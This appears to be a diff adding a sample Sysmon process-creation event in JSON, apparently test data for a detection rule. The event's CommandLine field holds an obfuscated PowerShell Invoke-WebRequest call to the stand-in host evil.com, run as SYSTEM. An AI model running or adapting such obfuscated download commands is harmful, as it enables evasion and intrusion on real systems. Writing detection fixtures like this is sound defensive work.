@@ -1,0 +1,18 @@
+[{
+    "TenantId": "54b708be-a187-41a9-bb08-c8f8d95d5e2f",
+    "SourceSystem": "OpsManager",
+    "TimeGenerated": "2025-02-24T14:25:02.2057707Z",
+    "Source": "Microsoft-Windows-Sysmon",
+    "EventLog": "Microsoft-Windows-Sysmon/Operational",
+    "Computer": "dc1-mon",
+    "EventLevel": 4,
+    "EventLevelName": "Information",
+    "EventID": 1,
+    "CommandLine": "powershell.exe -enc I`n`v`o`k`e%-W%e%b%R^e^q^u^e^st -Uri 'http://evil.com'",
+    "RenderedDescription": "Process Create:",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "ProcessId": "1234",
+    "ProcessGuid": "{3d7a6f6f-813e-67bc-9a01-000000000300}"
+}]
+
